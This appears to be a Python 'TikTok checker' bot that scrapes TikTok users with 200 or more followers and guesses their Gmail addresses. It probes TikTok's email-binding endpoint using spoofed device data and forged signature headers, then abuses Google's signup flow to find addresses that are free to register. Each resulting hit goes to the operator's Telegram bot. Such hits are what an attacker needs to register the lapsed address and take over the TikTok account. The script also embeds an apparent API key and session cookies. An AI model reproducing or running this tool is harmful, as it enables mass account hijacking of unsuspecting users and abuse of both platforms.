#!/usr/bin/env python3
"""
TikTok Checker Bot - Fixed & Optimized Version
Original by KENDO | Enhanced Version with bug fixes
"""

# ============================================================
# Step 1: Check & install required libraries
# ============================================================
import subprocess
import sys

REQUIRED_LIBS = [
    "requests",
    "rich",
    "cfonts",
    "user_agent",
    "beautifulsoup4",
    "pycryptodome",
]

missing = []
for lib in REQUIRED_LIBS:
    try:
        __import__(lib.replace("beautifulsoup4", "bs4").replace("pycryptodome", "Crypto").replace("user_agent", "user_agent"))
    except ImportError:
        missing.append(lib)

if missing:
    print(f"[!] Installing missing libraries: {', '.join(missing)}")
    subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
    print("[+] Libraries installed. Restarting...\n")
    os.execv(sys.executable, [sys.executable] + sys.argv)

# MedoSigner check (optional - will provide fallback)
try:
    from MedoSigner import Argus, Gorgon, md5, Ladon
    MEDOSIGNER_AVAILABLE = True
except ImportError:
    MEDOSIGNER_AVAILABLE = False
    print("[!] MedoSigner not found. Installing...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "MedoSigner"])
        from MedoSigner import Argus, Gorgon, md5, Ladon
        MEDOSIGNER_AVAILABLE = True
    except Exception:
        print("[!] MedoSigner unavailable. TikTok signing will use fallback mode.")

# ============================================================
# Step 2: Imports
# ============================================================
import os
import re
import json
import time
import random
import secrets
import binascii
import threading
import requests
from uuid import uuid4
from datetime import datetime
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor
from threading import Thread, Lock

from rich import print as g
from rich.panel import Panel
from cfonts import render, say
from user_agent import generate_user_agent
from bs4 import BeautifulSoup

# ============================================================
# Step 3: Colors
# ============================================================
R = '\033[1;31;40m'
X = '\033[1;33;40m'
F = '\033[1;32;40m'
C = "\033[1;97;40m"
B = '\033[1;36;40m'
K_c = '\033[1;35;40m'
V = '\033[1;36;40m'
a14 = '\x1b[38;5;153m'
a1 = '\x1b[1;31m'
a3 = '\x1b[1;32m'
a9 = '\x1b[1;37m'
P = '\x1b[1;97m'
H = '\x1b[1;92m'
K_y = '\x1b[1;93m'

E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m'
Z1 = '\033[2;31m'
A = '\033[2;34m'
S_c = '\033[2;36m'
G_c = '\033[1;34m'
HH = '\033[1;34m'
M = '\x1b[1;37m'

# ============================================================
# Step 4: Banner
# ============================================================
print(f"\x1b[1;31m—{V}" * 60)
print('\033[1;36;40m' + ''' ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
          █████╗          ██╗             ██╗
         ██╔══██╗         ██║             ██║
         ███████║         ██║             ██║
         ██╔══██║         ██║             ██║
         ██║  ██║         ██║             ███████╗
         ╚═╝  ╚═╝         ╚═╝             ╚══════╝
                ¸.•´¯•.¸¸ KENDO ¸.•´¯•.¸¸
               ☀ TLE : @IQEDZ  • https://t.me/Vibro_m

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬  ''')

# ============================================================
# Step 5: Print Status (thread-safe)
# ============================================================
print_lock = Lock()
hit, ge, be, gt, bt = 0, 0, 0, 0, 0
ids_list = []

def print_status():
    with print_lock:
        status = f"\r {F}HlT {X}: {A}{hit} ~ {Z}GOOD {S_c}: {M}{gt} ~ {C}NOT {HH}: {M}{bt} {K_y}"
        sys.stdout.write(status)
        sys.stdout.flush()

# ============================================================
# Step 6: TikTok Info + Telegram Notification
# ============================================================
def info(email):
    global hit, ge
    hit += 1
    email = str(email)
    user = email.split('@')[0]
    try:
        headers_api = {
            'X-RapidAPI-Host': 'tiktok-video-no-watermark2.p.rapidapi.com',
            'X-RapidAPI-Key': '54eb4910e1msh0b7d1211a1be475p12c3aejsnd55f85d359f3',
            'Host': 'tiktok-video-no-watermark2.p.rapidapi.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'User-Agent': 'okhttp/3.14.7',
        }
        url = f'https://tiktok-video-no-watermark2.p.rapidapi.com/user/info?unique_id={user}&user_id='
        r = requests.get(url, headers=headers_api, timeout=10).json()
        
        user_id = r['data']['user']['id']
        name = r['data']['user']['nickname']
        folon = r['data']['stats']['followingCount']
        folos = r['data']['stats']['followerCount']
        lik = r['data']['stats']['heartCount']
        vid = r['data']['stats']['videoCount']
        priv = r['data']['user']['privateAccount']

        ff = f'''
════════ KENDO ═════════
﴾ ÄĻÏ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ☀ ﴿
•၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10
☀FOLLOWERS: {folos}
☀FOLLOWING : {folon}
☀NAME : {name}
☀LIKES : {lik}
☀HIT  : {hit}
☀ID : {user_id}
☀PRIVATE : {priv}
☀VIDEOS : {vid}
☀GMAIL : {email}@gmail.com
☀USERNAME : {user}
•၊၊||၊|။||||။‌‌‌‌‌၊|• 0:10
﴾ ÄĻÏ 𝗧𝗜𝗞𝗧𝗢𝗞 𝗛𝗜𝗧 ☀ ﴿
═════════@IQEDZ════════════
Py: @IQEDZ | https://t.me/Vibro_m
   '''
    except Exception:
        ff = f'''
¸¸.•´¯•.¸ KENDO ¸.•´¯•.¸¸
الكميه : {hit}
يوزر : {user}
جميل : {email}@gmail.com
¸¸.•´¯•.¸ KENDO ¸.•´¯•.¸¸
Py : @IQEDZ | https://t.me/Vibro_m
   '''

    # Send to Telegram
    for attempt in range(3):
        try:
            requests.post(
                f"https://api.telegram.org/bot{tok}/sendMessage",
                data={"chat_id": iid, "text": ff},
                timeout=10
            )
            break
        except Exception as e:
            if attempt == 2:
                with print_lock:
                    print(f"\n{R}[!] Failed to send Telegram message: {e}")
            time.sleep(1)

    ge += 1
    print_status()

# ============================================================
# Step 7: Gmail Checker
# ============================================================
def Gmail(email):
    global hit, ge, be, gt, bt
    if '@' in email:
        email = email.split('@')[0]
    if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
        return False

    name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(random.randrange(5, 10)))
    birthday = (random.randrange(1980, 2010), random.randrange(1, 12), random.randrange(1, 28))

    try:
        s = requests.Session()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://accounts.google.com/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        params = {
            'biz': 'false',
            'continue': 'https://mail.google.com/mail/u/0/',
            'ddm': '1',
            'emr': '1',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'followup': 'https://mail.google.com/mail/u/0/',
            'osid': '1',
            'service': 'mail',
        }

        response = s.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers, timeout=15)
        tl = response.url.split('TL=')[1]
        s1 = response.text.split('"Qzxixc":"')[1].split('"')[0]
        at = response.text.split('"SNlM0e":"')[1].split('"')[0]

        # Step 1: Submit name
        headers_post = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',
            'user-agent': headers['user-agent'],
            'x-same-domain': '1',
        }

        params_rpc = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }

        data = f'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{name}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
        s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
               params=params_rpc, headers=headers_post, data=data, timeout=15)

        # Step 2: Submit birthday
        params_rpc2 = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }

        data2 = f'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{birthday[0]}%2C{birthday[1]}%2C{birthday[2]}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22...%5C%22%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
        s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
               params=params_rpc2, headers=headers_post, data=data2, timeout=15)

        # Step 3: Check username availability
        params_rpc3 = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',
            'hl': 'en-US',
            'TL': tl,
            'rt': 'c',
        }

        data3 = f'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{email}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={at}&'
        response = s.post('https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
                          params=params_rpc3, headers=headers_post, data=data3, timeout=15).text

        if "password" in response:
            info(email)
            ge += 1
            print_status()
            return True
        else:
            be += 1
            print_status()
            return False

    except Exception as e:
        be += 1
        print_status()
        return False

# ============================================================
# Step 8: TikTok Signer (with fallback)
# ============================================================
def sign(params, payload="", sec_device_id="", cookie=None,
         aid=1233, license_id=1611921764, sdk_version_str="2.3.1.i18n",
         sdk_version=2, platform=19, unix=None):
    if MEDOSIGNER_AVAILABLE and payload is not None:
        try:
            x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
            if not unix:
                unix = int(time.time())
            gorgon_val = Gorgon(params, unix, payload, cookie).get_value()
            return gorgon_val | {
                "x-ladon": Ladon.encrypt(unix, license_id, aid),
                "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid,
                                          license_id=license_id, sec_device_id=sec_device_id,
                                          sdk_version=sdk_version_str, sdk_version_int=sdk_version)
            }
        except Exception:
            pass

    # Fallback: generate fake headers
    if not unix:
        unix = int(time.time())
    return {
        "x-gorgon": binascii.hexlify(os.urandom(16)).decode(),
        "x-khronos": str(unix),
        "x-ladon": binascii.hexlify(os.urandom(32)).decode(),
        "x-argus": binascii.hexlify(os.urandom(16)).decode(),
    }

# ============================================================
# Step 9: Parameters & Headers Generator
# ============================================================
def para():
    secret = secrets.token_hex(16)
    device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
    device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
    regions = ["AE", "IQ", "US", "FR", "DE"]
    languages = ["ar", "en", "fr", "de"]

    params = {
        'passport-sdk-version': "6030790",
        'iid': str(random.randint(1, 10**19)),
        'device_id': str(random.randint(1, 10**19)),
        'ac': "WIFI",
        'channel': "googleplay",
        'aid': "1233",
        'app_name': "musical_ly",
        'version_code': "360505",
        'version_name': "36.5.5",
        'device_platform': "android",
        'os': "android",
        'ab_version': "36.5.5",
        'ssmix': "a",
        'device_type': random.choice(device_types),
        'device_brand': random.choice(device_brands),
        'language': random.choice(languages),
        'os_api': str(random.randint(28, 34)),
        'os_version': str(random.randint(10, 14)),
        'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
        'manifest_version_code': "2023605050",
        'resolution': "1440*2969",
        'dpi': str(random.choice([420, 480, 532])),
        'update_version_code': "2023605050",
        '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
        'is_pad': "0",
        'app_type': "normal",
        'sys_region': random.choice(regions),
        'last_install_time': str(random.randint(1600000000, 1700000000)),
        'mcc_mnc': "41820",
        'timezone_name': "Asia/Baghdad",
        'carrier_region_v2': "418",
        'app_language': random.choice(languages),
        'carrier_region': random.choice(regions),
        'ac2': "wifi",
        'uoo': "0",
        'op_region': random.choice(regions),
        'timezone_offset': str(random.randint(0, 14400)),
        'build_number': "36.5.5",
        'host_abi': "arm64-v8a",
        'locale': random.choice(languages),
        'region': random.choice(regions),
        'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
        'cdid': str(uuid4()),
        'support_webview': "1",
        'reg_store_region': random.choice(regions).lower(),
        'user_selected_region': "0",
        'cronet_version': "1c651b66_2024-08-30",
        'ttnet_version': "4.2.195.8-tiktok",
        'use_store_region_cookie': "1"
    }
    return params

def headd():
    pp = para()
    try:
        m = sign(params=urlencode(pp), payload="", cookie="")
    except Exception:
        m = {
            "x-gorgon": binascii.hexlify(os.urandom(16)).decode(),
            "x-khronos": str(int(time.time())),
            "x-ladon": binascii.hexlify(os.urandom(32)).decode(),
            "x-argus": binascii.hexlify(os.urandom(16)).decode(),
        }

    app_name = "com.zhiliaoapp.musically"
    app_version = f"{random.randint(2000000000, 3000000000)}"
    locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
    locale = random.choice(locales)
    device_types = ["phone", "tablet", "tv"]
    device_type = random.choice(device_types)
    build = f"UP1A.{random.randint(200000000, 300000000)}"
    cronet_version = f"{random.randint(10000000, 20000000)}"
    cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
    quic_version = f"{random.randint(10000000, 20000000)}"
    quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"

    user_agent = (f"{app_name}/{app_version} (Linux; U; Android {random.randint(10, 15)}; {locale}; {device_type}; "
                  f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                  f"QuicVersion:{quic_version} {quic_date})")

    headers = {
        'User-Agent': user_agent,
        'x-tt-passport-csrf-token': secrets.token_hex(16),
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-argus': m.get("x-argus", ""),
        'x-gorgon': m.get("x-gorgon", ""),
        'x-khronos': m.get("x-khronos", ""),
        'x-ladon': m.get("x-ladon", ""),
    }
    return headers, pp

# ============================================================
# Step 10: TikTok Request (thread-safe session)
# ============================================================
def req(email):
    global hit, ge, be, gt, bt
    try:
        headers, params = headd()
        session = requests.Session()
        secret = secrets.token_hex(16)
        cookies = {
            "passport_csrf_token": secret,
            "passport_csrf_token_default": secret,
            "sessionid": "be5fa2334876c9c1ed1519d01ca2fba6"
        }
        session.cookies.update(cookies)

        url = "https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"
        payload = f"rules_version=v2&account_sdk_source=app&email_source=1&mix_mode=1&passport_ticket=PPTSGOSAYQ95DDATX2PENDFADNXDTNSTPZC4JU&multi_login=1&type=32&email={email}&email_theme=2"

        response = session.post(url, params=params, headers=headers, data=payload, timeout=15)
        re_text = response.text

        with print_lock:
            print(f"\n{M}{re_text[:200]}")

        if "1023" in re_text:
            Gmail(email)
            gt += 1
        else:
            bt += 1
        print_status()

    except Exception as e:
        bt += 1
        print_status()

# ============================================================
# Step 11: Main Worker (Search & Check)
# ============================================================
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, 'session'):
        thread_local.session = requests.Session()
    return thread_local.session

def hso1():
    while True:
        try:
            g_chars = random.choice([
                'abcdefghijklmnopqrstuvwxyz',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
            ])

            keyword = ''.join(random.choice(g_chars) for _ in range(random.randrange(4, 9)))
            idd6 = "".join(random.choice('1234567890') for _ in range(19))

            he3 = {
                "User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {random.randrange(7, 13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{random.randrange(3, 9)}.0)'
            }

            # Get ttwid
            try:
                ttwid_resp = requests.get('https://www.tiktok.com/', headers=he3, timeout=10)
                ttwid = ttwid_resp.cookies.get_dict().get('ttwid', '')
            except Exception:
                ttwid = ''

            # Get msToken
            try:
                zaid = requests.get(
                    f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad',
                    headers=he3, timeout=10
                )
                msToken = zaid.cookies.get_dict().get('msToken', '')
            except Exception:
                msToken = ''

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': he3["User-Agent"],
            }

            params = {
                'WebIdLastTime': '1715883147',
                'aid': '1988',
                'app_language': 'en',
                'app_name': 'tiktok_web',
                'browser_language': 'en-US',
                'browser_name': 'Mozilla',
                'browser_online': 'true',
                'browser_platform': 'Win32',
                'browser_version': he3["User-Agent"],
                'channel': 'tiktok_web',
                'cookie_enabled': 'true',
                'cursor': '220',
                'data_collection_enabled': 'false',
                'device_id': idd6,
                'device_platform': 'web_pc',
                'focus_state': 'true',
                'from_page': 'search',
                'history_len': '5',
                'is_fullscreen': 'false',
                'is_page_visible': 'true',
                'keyword': keyword,
                'odinId': '7369661640164000774',
                'os': 'windows',
                'priority_region': '',
                'referer': '',
                'region': 'PE',
                'screen_height': '864',
                'screen_width': '1536',
                'search_id': '20240801154310BA7846F9CDEDD312B464',
                'tz_name': 'Asia/Baghdad',
                'user_is_login': 'false',
                'webcast_language': 'en',
                'msToken': msToken,
                'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD',
                '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
            }

            ses = str(uuid4()).replace('-', '')
            cookies = {
                'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; ttwid={ttwid}; msToken={msToken}; uid_tt={ses[:16]}; sessionid={ses};',
                'pragma': 'no-cache',
            }

            try:
                response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers, cookies=cookies, timeout=15).json()
            except Exception:
                time.sleep(2)
                continue

            user_list = response.get('user_list', [])
            for users in user_list:
                try:
                    user_info = users.get('user_info', {})
                    ud = user_info.get('uid', '')
                    user = user_info.get('unique_id', '')
                    fol = user_info.get('follower_count', 0)

                    if int(fol) < 200:
                        continue
                    if '_' in user:
                        continue

                    email = user + '@gmail.com'
                    req(email)
                except Exception:
                    continue

        except Exception:
            time.sleep(1)
            continue

# ============================================================
# Step 12: Main Entry Point
# ============================================================
if __name__ == "__main__":
    print(f"\n{F}[+] All libraries loaded successfully!{C}")
    print(f"{F}[+] MedoSigner: {'Available' if MEDOSIGNER_AVAILABLE else 'Fallback mode'}{C}")
    print(f"{F}[+] Starting TikTok Checker Bot...{C}\n")

    iid = input('\033[2;32m' + 'ID : ')
    tok = input('\033[2;32m' + 'Token : ')

    # Validate Telegram token
    print(f"\n{Y}[*] Validating Telegram token...{C}")
    try:
        resp = requests.get(f"https://api.telegram.org/bot{tok}/getMe", timeout=10).json()
        if resp.get('ok'):
            bot_name = resp['result'].get('username', 'Unknown')
            print(f"{F}[+] Bot connected: @{bot_name}{C}\n")
        else:
            print(f"{R}[!] Invalid token! Exiting...{C}")
            sys.exit(1)
    except Exception as e:
        print(f"{R}[!] Failed to validate token: {e}{C}")
        print(f"{Y}[*] Continuing anyway...{C}\n")

    print(f"{F}[+] Starting 28 worker threads...{C}\n")
    print_status()
    print("\n")

    threads = []
    for i in range(28):
        t = Thread(target=hso1, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.2)  # Stagger thread starts to avoid rate limiting

    # Keep main thread alive
    try:
        while True:
            time.sleep(5)
            alive = sum(1 for t in threads if t.is_alive())
            with print_lock:
                print(f"\n{Y}[*] Active threads: {alive}/28 | Hit: {hit} | Good: {gt} | Bad: {bt}{C}")
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopping bot...{C}")
        sys.exit(0)
